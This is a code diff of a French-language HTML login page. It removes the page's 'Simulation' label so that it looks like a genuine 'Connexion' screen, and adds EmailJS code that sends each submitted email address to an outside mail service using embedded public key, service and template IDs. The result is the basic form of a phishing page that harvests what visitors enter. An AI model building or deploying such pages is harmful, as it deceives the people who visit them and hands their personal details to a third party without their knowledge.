@@ -1,24 +1,35 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
   <meta charset="UTF-8" />
   <title>Connexion</title>
+  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("7RS0UmuQ7ZaoYQniX"); // Ta Public Key
+    })();
+  </script>
 </head>
 <body>
-  <h2>Simulation de Connexion</h2>
-  <form onsubmit="envoyerInfos(); return false;">
-    <input type="email" id="email" placeholder="Adresse e-mail" required /><br /><br />
-    <input type="password" id="password" placeholder="Mot de passe" required /><br /><br />
+  <h2>Connexion</h2>
+  <form id="form">
+    <input type="email" name="mail" placeholder="Adresse e-mail" required />
+    <br /><br />
     <button type="submit">Se connecter</button>
   </form>
 
   <script>
-    function envoyerInfos() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const url = `resultat.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
-      window.location.href = url;
-    }
+    document.getElementById('form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      emailjs.sendForm('service_sr10r5c', 'template_8izfmwz', this)
+        .then(function() {
+          alert('Infos envoyées !');
+          document.getElementById('form').reset();
+        }, function(error) {
+          alert('Erreur lors de l’envoi.');
+          console.log('Erreur :', error);
+        });
+    });
   </script>
 </body>
 </html>
